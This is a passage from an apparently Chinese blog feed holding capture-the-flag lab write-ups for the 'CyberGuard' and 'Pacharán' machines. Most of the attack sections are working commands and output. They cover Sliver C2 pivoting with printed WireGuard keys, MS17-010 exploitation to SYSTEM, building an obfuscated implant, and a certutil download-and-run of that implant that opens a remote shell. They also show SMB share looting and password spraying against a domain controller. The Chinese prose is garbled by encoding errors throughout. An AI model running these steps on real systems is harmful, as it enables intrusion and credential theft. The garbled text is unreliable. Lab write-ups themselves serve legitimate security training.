        Session ID: 160113c3-b76b-4b38-a5eb-a03335a7dbb8
              Name: FORMIDABLE_FLOOR
          Hostname: TheHackersLabs-2-Cyberguard
              UUID: ed3dcaa8-d130-48be-8973-73101c3c3c31
          Username: www-data
               UID: 33
               GID: 33
               PID: 1053
                OS: linux
           Version: Linux TheHackersLabs-2-Cyberguard 6.1.0-25-amd64
            Locale: C
              Arch: amd64
         Active C2: wg://10.0.2.20:53
    Remote Address: 100.64.0.3:65311
         Proxy URL: 
Reconnect Interval: 1m0s
     First Contact: Mon Jul 28 12:49:33 CST 2025 (40m46s ago)
      Last Checkin: Mon Jul 28 13:28:31 CST 2025 (1m48s ago)
```

åˆ›å»º `WireGuard` å®¢æˆ·ç«¯é…ç½®

```bash
sliver (FORMIDABLE_FLOOR) > wg-config

[*] New client config:[Interface]
Address = 100.64.0.6/16
ListenPort = 51902
PrivateKey = MLVcslgYICxAUJMnhPF/h6LAiqOfjh1vF38pZdOt20w=
MTU = 1420

[Peer]
PublicKey = q36gtpUVlt9b9vCe4ZuM8+tU7zrDmN9SCAuSQ2jTYgQ=
AllowedIPs = 100.64.0.0/16
Endpoint = 10.0.2.20:53
```

ä½¿ç”¨ `wg-quick` è¿›è¡Œè¿æ¥

```bash
âœ  CyberGuard vim wgsocks.conf
```

```bash
âœ  CyberGuard wg-quick up wgsocks            
[#] ip link add wgsocks type wireguard
[#] wg setconf wgsocks /dev/fd/63
[#] ip -4 address add 100.64.0.6/16 dev wgsocks
[#] ip link set mtu 1420 up dev wgsocks
```

å†åœ¨ `sliver` ä¸­è¿è¡Œ `wg-socks`

```bash
sliver (FORMIDABLE_FLOOR) > wg-socks start

[*] Started SOCKS server on 100.64.0.3:3090
```

ç¼–è¾‘ `/etc/proxychains4.conf` æ–‡ä»¶

![image.png](/post-images/TheHackersLabsCyberGuard/image13.png)

æµ‹è¯•è¿æ¥ï¼Œä½¿ç”¨ä»£ç†è¿æ¥ `10.20.30.11` çš„ `SSH` æœåŠ¡

![image.png](/post-images/TheHackersLabsCyberGuard/image14.png)

å½“å‰ç”¨æˆ·å¯ä»¥æ‹¿åˆ° `user.txt`

```bash
ian@TheHackersLabs-2-Cyberguard:~$ cat user.txt 
1850axxxxxxxxxxxxxxxxxxxxxxxxx
```

### **10.20.30.11**

æŸ¥çœ‹ `sudo` æƒé™

```bash
ian@TheHackersLabs-2-Cyberguard:~$ sudo -l
Matching Defaults entries for ian on TheHackersLabs-2-Cyberguard:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User ian may run the following commands on TheHackersLabs-2-Cyberguard:
    (ALL) NOPASSWD: /usr/bin/tcpdump, /usr/sbin/arpspoof
```

æˆ‘è¿™é‡Œæ‰“ç®—è¿›è¡Œææƒï¼Œä½†æ˜¯`tcpdump` å¹¶æ— æ³•è¿›è¡Œè¿è¡Œè„šæœ¬ï¼Œç´¢æ€§å…ˆæ”¾æ‰

è¿™é‡Œä¸Šä¼  `fscan` è¿›è¡Œå†…ç½‘æšä¸¾

```bash
sliver (FORMIDABLE_FLOOR) > upload ../../Tools/fscan/fscan_1.8.4

[*] Wrote file to /var/www/cyberguard/config/fscan_1.8.4
```

æŒ‡å®š `IP` èŒƒå›´ `10.20.30.1-255`

```bash
ian@TheHackersLabs-2-Cyberguard:~$ ./fscan_1.8.4 -h 10.20.30.1-255

   ___                              _    
  / _ \     ___  ___ _ __ __ _  ___| | __ 
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <    
\____/     |___/\___|_|  \__,_|\___|_|\_\   
                     fscan version: 1.8.4
start infoscan
trying RunIcmp2
The current user permissions unable to send icmp packets
start ping
(icmp) Target 10.20.30.11     is alive
(icmp) Target 10.20.30.1      is alive
(icmp) Target 10.20.30.3      is alive
(icmp) Target 10.20.30.15     is alive
[*] Icmp alive hosts len is: 4
10.20.30.3:445 open
10.20.30.3:139 open
10.20.30.3:135 open
10.20.30.1:80 open
10.20.30.15:22 open
10.20.30.11:22 open
10.20.30.11:8080 open
10.20.30.3:88 open
10.20.30.1:8090 open
[*] alive ports len is: 9
start vulscan
[+] MS17-010 10.20.30.3 (Windows Server 2016 Datacenter 14393)
[*] NetInfo 
[*]10.20.30.3
   [->]WIN-VRU3GG3DPLJ
   [->]10.20.30.3
[*] NetBios 10.20.30.3      [+] DC:WIN-VRU3GG3DPLJ.cyberguard.thl      Windows Server 2016 Datacenter 14393
[*] WebTitle http://10.20.30.11:8080   code:200 len:1045   title:Join Our Cybersecurity Team
[*] WebTitle http://10.20.30.1         code:200 len:1039   title:Join Our Cybersecurity Team
[*] WebTitle http://10.20.30.1:8090    code:200 len:2784   title:Login | OPNsense
```

### MS17-010 âœ…

ç«Ÿç„¶æšä¸¾å‡ºæ¥äº† `10.20.30.3` å­˜åœ¨æ°¸æ’ä¹‹è“ï¼ˆMS17-010ï¼‰ï¼Œå°è¯•ä¸€æ³¢

```bash
proxychains4 -q msfconsole
```

```bash
msf6 auxiliary(admin/smb/ms17_010_command) > run
[*] 10.20.30.3:445        - Target OS: Windows Server 2016 Datacenter 14393
[*] 10.20.30.3:445        - Built a write-what-where primitive...
[+] 10.20.30.3:445        - Overwrite complete... SYSTEM session obtained!
[+] 10.20.30.3:445        - Service start timed out, OK if running a command or non-service executable...
[*] 10.20.30.3:445        - Getting the command output...
[*] 10.20.30.3:445        - Executing cleanup...
[+] 10.20.30.3:445        - Cleanup was successful
[+] 10.20.30.3:445        - Command completed successfully!
[*] 10.20.30.3:445        - Output for "whoami":

nt authority\system

[*] 10.20.30.3:445        - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

ç„¶åå¯ä»¥ç›´æ¥è¯»å– `root.txt`

```bash
msf6 auxiliary(admin/smb/ms17_010_command) > set ComMAND type C:\\users\\Administrador\\Documents\\root.txt
ComMAND => type C:\users\Administrador\Documents\root.txt
msf6 auxiliary(admin/smb/ms17_010_command) > run
[*] 10.20.30.3:445        - Target OS: Windows Server 2016 Datacenter 14393
[*] 10.20.30.3:445        - Built a write-what-where primitive...
[+] 10.20.30.3:445        - Overwrite complete... SYSTEM session obtained!
[+] 10.20.30.3:445        - Service start timed out, OK if running a command or non-service executable...
[*] 10.20.30.3:445        - Getting the command output...
[*] 10.20.30.3:445        - Executing cleanup...
[+] 10.20.30.3:445        - Cleanup was successful
[+] 10.20.30.3:445        - Command completed successfully!
[*] 10.20.30.3:445        - Output for "type C:\users\Administrador\Documents\root.txt":

0257xxxxxxxxxxxxxxxxxxxxxxxxx

[*] 10.20.30.3:445        - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

æ‹¿ `shell` çš„è¯å¯ä»¥ç”Ÿæˆ `Windows` æ¤å…¥ç‰©

```bash
sliver (FORMIDABLE_FLOOR) > generate -o windows --wg 10.0.2.20 -a amd64 -f exe 

[*] Generated unique ip for wg peer tun interface: 100.64.0.7
[*] Generating new windows/amd64 implant binary
[*] Symbol obfuscation is enabled
[*] Build completed in 1m1s
[*] Implant saved to /root/Desktop/TheHackersLabs/CyberGuard/LONG_PRIVATE.exe
```

ä¸Šä¼ åˆ° `10.20.30.11` å¹¶å¼€å¯ `HTTP` æœåŠ¡å™¨

```bash
ian@TheHackersLabs-2-Cyberguard:~$ python3 -m http.server 2131
Serving HTTP on 0.0.0.0 port 2131 (http://0.0.0.0:2131/) ...
```

ç„¶åé€šè¿‡ `certutil.exe` ä¸‹è½½åˆ° `c` ç›˜

```bash
msf6 auxiliary(admin/smb/ms17_010_command) > set command "certutil.exe -urlcache -split -f http://10.20.30.11:2131/LONG_PRIVATE.exe C:\\LONG_PRIVATE.exe"
"
msf6 auxiliary(admin/smb/ms17_010_command) > run
[*] 10.20.30.3:445        - Target OS: Windows Server 2016 Datacenter 14393
[*] 10.20.30.3:445        - Built a write-what-where primitive...
[+] 10.20.30.3:445        - Overwrite complete... SYSTEM session obtained!
[+] 10.20.30.3:445        - Service start timed out, OK if running a command or non-service executable...
[*] 10.20.30.3:445        - Getting the command output...
[*] 10.20.30.3:445        - Executing cleanup...
[+] 10.20.30.3:445        - Cleanup was successful
[+] 10.20.30.3:445        - Command completed successfully!
[*] 10.20.30.3:445        - Output for "certutil.exe -urlcache -split -f http://10.20.30.11:2131/LONG_PRIVATE.exe":

****  En lnea  ****
  000000  ...
  1280000
CertUtil: -URLCache comando completado correctamente.

[*] 10.20.30.3:445        - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

ä¹‹åè¿è¡Œ `LONG_PRIVATE.exe`

```bash
msf6 auxiliary(admin/smb/ms17_010_command) > set command "C:\\LONG_PRIVATE.exe"
msf6 auxiliary(admin/smb/ms17_010_command) > run
```

![image.jpg](/post-images/TheHackersLabsCyberGuard/images15.jpg)

ç„¶åå°±æ‹¿åˆ° `shell` äº†

```bash
sliver (LONG_PRIVATE) > shell

? This action is bad OPSEC, are you an adult? Yes

[*] Wait approximately 10 seconds after exit, and press <enter> to continue
[*] Opening shell tunnel (EOF to exit) ...

[*] Started remote shell with pid 1292

PS C:\Windows\system32> whoami
whoami
nt authority\system
```

## æ€»ç»“

è›®éš¾çš„ï¼Œåœ¨å¼¹ `shell`çš„æ—¶å€™å¡äº†å¾ˆä¹…ï¼ˆè¿™é‡Œçœ‹äº†`WP`æ‰çŸ¥é“è¦ç”¨`sliver`å¼¹ï¼‰

æ‰“å®Œä¹‹åå‘ç°ï¼Œé¢„æœŸè§£å¹¶ä¸æ˜¯ä½¿ç”¨ `MS17-010`

è€Œæ˜¯åœ¨å¦å¤–ä¸€å° `Linux` ä¸»æœºä¸­ç›‘å¬æ•°æ®åŒ…èƒ½å¾—åˆ° `Victor` ç”¨æˆ·çš„ `Net-NTLM-hash` ï¼Œä¹‹åå†ä½¿ç”¨ `certipy` è¿›è¡Œæ“ä½œ

é¢„æœŸè§£WPï¼šhttps://blog.thehackerslabs.com/resolucion-del-ctf-cyberguard/

è¿˜æœ‰å­¦ä¹ åˆ°äº† `sliver` è¿™ä¸ª `C2` æ¡†æ¶ï¼Œæ„Ÿè§‰è¿˜ä¸é”™ï¼Œä¸ç”¨è‡ªå·±å†ç«¯å£è½¬å‘æ‰èƒ½ä¸Šçº¿]]></content:encoded>
            <category>é¶æœº</category>
            <category>TheHackersLabs</category>
            <category>Windows</category>
            <category>Linux</category>
            <category>MS17-010</category>
            <category>Sliver</category>
            <category>SQLInjection</category>
        </item>
        <item>
            <title><![CDATA[TheHackersLabs - PacharÃ¡n]]></title>
            <link>https://www.sunsetaction.top/2025/07/27/TheHackersLabsPacharÃ¡n</link>
            <guid isPermaLink="false">https://www.sunsetaction.top/2025/07/27/TheHackersLabsPacharÃ¡n</guid>
            <pubDate>Sun, 27 Jul 2025 00:00:00 GMT</pubDate>
            <description><![CDATA[PacharÃ¡n https://labs.thehackerslabs.com/machine/61 Recon PortScan æšä¸¾ SMB åŒ¿åæµ‹è¯• å¯ä»¥ä½¿ç”¨åŒ¿åè´¦æˆ· ç›´æ¥ç”¨nxcå…¨éƒ¨æ‹‰ä¸‹æ¥ å¾—åˆ°ä¸€ä¸ª txt æ–‡ä»¶ Orujo.txt åƒæ˜¯ä¸€ä¸ªå‡­æ®ï¼Œæµ‹è¯•ä¸€ä¸‹ æˆåŠŸæ‹¿åˆ° orujo çš„å‡­æ® åŸŸ...]]></description>
            <content:encoded><![CDATA[
# PacharÃ¡n

> https://labs.thehackerslabs.com/machine/61
> 

![image.png](/post-images/TheHackersLabsPacharÃ¡n/image.png)

## Recon

### PortScan

```bash
âœ  PacharÃ¡n nmap -sn 192.168.69.0/24
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-27 13:00 CST
Nmap scan report for 192.168.69.1
Host is up (0.00060s latency).
MAC Address: 0A:00:27:00:00:11 (Unknown)
Nmap scan report for 192.168.69.2
Host is up (0.00034s latency).
MAC Address: 08:00:27:5F:F4:7E (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.69.69
Host is up (0.00060s latency).
MAC Address: 08:00:27:4F:85:91 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.69.10
Host is up.
Nmap done: 256 IP addresses (4 hosts up) scanned in 2.10 seconds
```

```bash
âœ  PacharÃ¡n nmap -sT -min-rate 10000 -p- 192.168.69.69
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-27 13:00 CST
Warning: 192.168.69.69 giving up on port because retransmission cap hit (10).
Strange read error from 192.168.69.69 (104 - 'Connection reset by peer')
Nmap scan report for 192.168.69.69
Host is up (0.00020s latency).
Not shown: 65236 closed tcp ports (conn-refused), 275 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm

MAC Address: 08:00:27:4F:85:91 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 13.27 seconds
```

```bash
âœ  PacharÃ¡n nmap -sT -A -p $(cat port | awk -F '/' '{print $1}' | paste -sd ',') 192.168.69.69
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-27 13:01 CST
Nmap scan report for 192.168.69.69
Host is up (0.00052s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-27 12:01:34Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: PACHARAN.THL, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: PACHARAN.THL, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
MAC Address: 08:00:27:4F:85:91 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Microsoft Windows 2016|2019
OS CPE: cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_server_2019
OS details: Microsoft Windows Server 2016 or Server 2019
Network Distance: 1 hop
Service Info: Host: WIN-VRU3GG3DPLJ; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: WIN-VRU3GG3DPLJ, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:4f:85:91 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
| smb2-time:
|   date: 2025-07-27T12:01:36
|_  start_date: 2025-07-27T11:55:15
|_clock-skew: 6h59m57s
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required

TRACEROUTE
HOP RTT     ADDRESS
1   0.52 ms 192.168.69.69

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.47 seconds
```

### æšä¸¾

`SMB` åŒ¿åæµ‹è¯•

å¯ä»¥ä½¿ç”¨åŒ¿åè´¦æˆ·

```bash
âœ  PacharÃ¡n smbclient -L 192.168.69.69 -U anonymous
Password for [WORKGROUP\anonymous]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Admin remota
        C$              Disk      Recurso predeterminado
        IPC$            IPC       IPC remota
        NETLOGON        Disk      Recurso compartido del servidor de inicio de sesiÃ³n 
        NETLOGON2       Disk      
        PACHARAN        Disk      
        PDF Pro Virtual Printer Printer   Soy Hacker y arreglo impresoras
        print$          Disk      Controladores de impresora
        SYSVOL          Disk      Recurso compartido del servidor de inicio de sesiÃ³n 
        Users           Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 192.168.69.69 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

ç›´æ¥ç”¨`nxc`å…¨éƒ¨æ‹‰ä¸‹æ¥

```bash
âœ  PacharÃ¡n nxc smb 192.168.69.69 -u 'anonymous' -p '' --smb-timeout 9999 -M spider_plus -o DOWNLOAD_FLAG=True 
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [*] Windows 10 / Server 2016 Build 14393 x64 (name:WIN-VRU3GG3DPLJ) (domain:PACHARAN.THL) (signing:True) (SMBv1:False) 
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\anonymous: (Guest)
SPIDER_PLUS 192.168.69.69   445    WIN-VRU3GG3DPLJ  [*] Started module spidering_plus with the following options:
SPIDER_PLUS 192.168.69.69   445    WIN-VRU3GG3DPLJ  [*]  DOWNLOAD_FLAG: True
SPIDER_PLUS 192.168.69.69   445    WIN-VRU3GG3DPLJ  [*]     STATS_FLAG: True
SPIDER_PLUS 192.168.69.69   445    WIN-VRU3GG3DPLJ  [*] EXCLUDE_FILTER: ['print$', 'ipc$']
SPIDER_PLUS 192.168.69.69   445    WIN-VRU3GG3DPLJ  [*]   EXCLUDE_EXTS: ['ico', 'lnk']
SPIDER_PLUS 192.168.69.69   445    WIN-VRU3GG3DPLJ  [*]  MAX_FILE_SIZE: 50 KB
SPIDER_PLUS 192.168.69.69   445    WIN-VRU3GG3DPLJ  [*]  OUTPUT_FOLDER: /root/.nxc/modules/nxc_spider_plus
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [*] Enumerated shares
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  Share           Permissions     Remark
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  -----           -----------     ------
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  ADMIN$                          Admin remota
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  C$                              Recurso predeterminado
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  IPC$            READ            IPC remota
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  NETLOGON                        Recurso compartido del servidor de inicio de sesiÃ³n 
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  NETLOGON2       READ            
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  PACHARAN                        
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  PDF Pro Virtual Printer                 Soy Hacker y arreglo impresoras
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  print$                          Controladores de impresora
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  SYSVOL                          Recurso compartido del servidor de inicio de sesiÃ³n 
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  Users                           
SPIDER_PLUS 192.168.69.69   445    WIN-VRU3GG3DPLJ  [+] Saved share-file metadata to "/root/.nxc/modules/nxc_spider_plus/192.168.69.69.json".
SPIDER_PLUS 192.168.69.69   445    WIN-VRU3GG3DPLJ  [*] SMB Shares:           10 (ADMIN$, C$, IPC$, NETLOGON, NETLOGON2, PACHARAN, PDF Pro Virtual Printer, print$, SYSVOL, Users)
SPIDER_PLUS 192.168.69.69   445    WIN-VRU3GG3DPLJ  [*] SMB Readable Shares:  2 (IPC$, NETLOGON2)
SPIDER_PLUS 192.168.69.69   445    WIN-VRU3GG3DPLJ  [*] SMB Filtered Shares:  1
SPIDER_PLUS 192.168.69.69   445    WIN-VRU3GG3DPLJ  [*] Total folders found:  0
SPIDER_PLUS 192.168.69.69   445    WIN-VRU3GG3DPLJ  [*] Total files found:    1
SPIDER_PLUS 192.168.69.69   445    WIN-VRU3GG3DPLJ  [*] File size average:    22 B
SPIDER_PLUS 192.168.69.69   445    WIN-VRU3GG3DPLJ  [*] File size min:        22 B
SPIDER_PLUS 192.168.69.69   445    WIN-VRU3GG3DPLJ  [*] File size max:        22 B
SPIDER_PLUS 192.168.69.69   445    WIN-VRU3GG3DPLJ  [*] File unique exts:     1 (txt)
SPIDER_PLUS 192.168.69.69   445    WIN-VRU3GG3DPLJ  [*] Downloads successful: 1
SPIDER_PLUS 192.168.69.69   445    WIN-VRU3GG3DPLJ  [+] All files processed successfully.
```

å¾—åˆ°ä¸€ä¸ª `txt` æ–‡ä»¶ `Orujo.txt`

```bash
âœ  PacharÃ¡n cat Orujo.txt                                 
Pericodelospalotes6969#
```

åƒæ˜¯ä¸€ä¸ªå‡­æ®ï¼Œæµ‹è¯•ä¸€ä¸‹

```bash
âœ  PacharÃ¡n nxc smb 192.168.69.69 -u 'orujo' -p 'Pericodelospalotes6969' --smb-timeout 9999                             
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [*] Windows 10 / Server 2016 Build 14393 x64 (name:WIN-VRU3GG3DPLJ) (domain:PACHARAN.THL) (signing:True) (SMBv1:False) 
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\orujo:Pericodelospalotes6969 
```

æˆåŠŸæ‹¿åˆ° `orujo` çš„å‡­æ®

```bash
âœ  PacharÃ¡n nxc ldap 192.168.69.69 -u 'orujo' -p 'Pericodelospalotes6969'                                  
LDAP        192.168.69.69   389    WIN-VRU3GG3DPLJ  [*] Windows 10 / Server 2016 Build 14393 (name:WIN-VRU3GG3DPLJ) (domain:PACHARAN.THL)
LDAP        192.168.69.69   389    WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\orujo:Pericodelospalotes6969

âœ  PacharÃ¡n nxc winrm 192.168.69.69 -u 'orujo' -p 'Pericodelospalotes6969'
WINRM       192.168.69.69   5985   WIN-VRU3GG3DPLJ  [*] Windows 10 / Server 2016 Build 14393 (name:WIN-VRU3GG3DPLJ) (domain:PACHARAN.THL)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       192.168.69.69   5985   WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\orujo:Pericodelospalotes6969
```

## åŸŸåˆ†æ

æ”¶é›†ä¿¡æ¯ä¸Š`BLoodHound`

```bash
âœ  PacharÃ¡n bloodhound-python -d 'PACHARAN.thl' -ns 192.168.69.69 --zip -c All -dc 'WIN-VRU3GG3DPLJ.PACHARAN.THL' -u orujo -p 'Pericodelospalotes6969'
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: pacharan.thl
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Connecting to LDAP server: WIN-VRU3GG3DPLJ.PACHARAN.THL
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: WIN-VRU3GG3DPLJ.PACHARAN.THL
INFO: Found 17 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: WIN-VRU3GG3DPLJ.PACHARAN.THL
INFO: Done in 00M 01S
INFO: Compressing output into 20250727132554_bloodhound.zip
```

å½“å‰ç”¨æˆ·æ‰€å±ç»„

![image.png](/post-images/TheHackersLabsPacharÃ¡n/image1.png)

æ‰€æœ‰åŸŸç”¨æˆ·

![image.png](/post-images/TheHackersLabsPacharÃ¡n/image2.png)

è¿œç¨‹ç®¡ç†ç»„æˆå‘˜ï¼Œåªæœ‰ä¸€ä¸ªï¼Œæš‚æ—¶è®¾å®šä¸ºç›®æ ‡ç”¨æˆ·

![image.png](/post-images/TheHackersLabsPacharÃ¡n/image3.png)

## To Whisky

æˆ‘ä»¬ç»§ç»­æšä¸¾ä¸€ä¸‹ä¿¡æ¯

æ‹‰å– `orujo` ç”¨æˆ·å¯ä»¥ä¸‹è½½çš„æ‰€æœ‰æ–‡ä»¶

```bash
nxc smb 192.168.69.69 -u 'orujo' -p 'Pericodelospalotes6969' --smb-timeout 9999 -M spider_plus -o DOWNLOAD_FLAG=True
```

èƒ½ä¸‹è½½å‡ºæ¥ä¸€ä¸ª `au.txt` æ–‡ä»¶ï¼Œæ˜¯ä¸€ä¸ªå¯†ç å­—å…¸

![image.png](/post-images/TheHackersLabsPacharÃ¡n/image4.png)

æŸ¥è¯¢ä¸€ä¸‹å¯†ç é˜ˆå€¼

```bash
âœ  PACHARAN bloodyAD -d 'PACHARAN.THL' -u orujo -p 'Pericodelospalotes6969' --dc-ip 192.168.69.69 get object 'DC=PACHARAN,DC=THL' --attr minPwdLength,maxPwdAge,minPwdAge,pwdHistoryLength,lockoutThreshold,lockoutDuration,lockOutObservationWindow,pwdProperties

distinguishedName: DC=PACHARAN,DC=THL
lockOutObservationWindow: -18000000000
lockoutDuration: -18000000000
lockoutThreshold: 0
maxPwdAge: -42 days, 0:00:00
minPwdAge: -1 day, 0:00:00
minPwdLength: 7
pwdHistoryLength: 24
pwdProperties: 1
```

å¯†ç é˜ˆå€¼ä¸º`0` ï¼Œé”å®šè´¦æˆ·åŠŸèƒ½è¢«ç¦ç”¨

æ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ©ç”¨å¾—åˆ°çš„å­—å…¸æ¥è¿›è¡Œå¯†ç å–·æ´’

```bash
âœ  PacharÃ¡n nxc smb 192.168.69.69 -u users.txt  -p ah.txt --smb-timeout 9999 --continue-on-success | grep '[+]'
SMB                      192.168.69.69   445    WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\Whisky:MamasoyStream2er@ 
```

å¾—åˆ°`Whisky`çš„å‡­æ®ï¼Œ`Whisky:MamasoyStream2er@` 

## To Chivas Regal

è¿™é‡Œå°è¯•äº†å¾ˆå¤šçš„æ”»å‡»ï¼Œä¾‹å¦‚ `Kerberoate`ç­‰

å†å°è¯•æšä¸¾ä¸€ä¸‹ä¿¡æ¯

SMB ä¸­æˆ‘ä»¬èƒ½æ³¨æ„åˆ° **`PDF Pro Virtual Printer WRITE`** ï¼Œåº”è¯¥æ˜¯æ‰“å°æœºå…±äº«

å¹¶ä¸”æè¿°ï¼šæˆ‘æ˜¯ä¸€åé»‘å®¢ï¼Œæˆ‘ä¿®ç†æ‰“å°æœºï¼Œé€šç”¨æ–‡æ¡£è½¬æ¢å™¨

![image.png](/post-images/TheHackersLabsPacharÃ¡n/image5.png)

å°è¯•è¿æ¥ä¸Š`RPCclient` æšä¸¾æ‰“å°æœº

```bash
âœ  PacharÃ¡n rpcclient 192.168.69.69 -U pacharan.thl/Whisky%MamasoyStream2er@ 
rpcclient $> enumprinters
        flags:[0x800000]
        name:[\\192.168.69.69\Soy Hacker y arreglo impresoras]
        description:[\\192.168.69.69\Soy Hacker y arreglo impresoras,Universal Document Converter,TurkisArrusPuchuchuSiu1]
        comment:[Soy Hacker y arreglo impresoras]
```

æˆ‘ä»¬è¿˜çœ‹åˆ°æè¿°åè¿˜å¸¦è¿™ä¸ªå­—ç¬¦ä¸² `TurkisArrusPuchuchuSiu1` 

æˆ‘ä»¬å°†å…¶æ‹¿å»è¿›è¡Œå¯†ç å–·æ´’

```bash
âœ  PacharÃ¡n nxc smb 192.168.69.69 -u users.txt -p 'TurkisArrusPuchuchuSiu1' --smb-timeout 9999                
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [*] Windows 10 / Server 2016 Build 14393 x64 (name:WIN-VRU3GG3DPLJ) (domain:PACHARAN.THL) (signing:True) (SMBv1:False) 
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\Administrador:TurkisArrusPuchuchuSiu1 STATUS_LOGON_FAILURE 
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\Invitado:TurkisArrusPuchuchuSiu1 STATUS_LOGON_FAILURE 
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\krbtgt:TurkisArrusPuchuchuSiu1 STATUS_LOGON_FAILURE 
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\DefaultAccount:TurkisArrusPuchuchuSiu1 STATUS_LOGON_FAILURE 
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\Orujo:TurkisArrusPuchuchuSiu1 STATUS_LOGON_FAILURE 
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\Ginebra:TurkisArrusPuchuchuSiu1 STATUS_LOGON_FAILURE 
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\Whisky:TurkisArrusPuchuchuSiu1 STATUS_LOGON_FAILURE 
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\Hendrick:TurkisArrusPuchuchuSiu1 STATUS_LOGON_FAILURE 
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\Chivas Regal:TurkisArrusPuchuchuSiu1
```

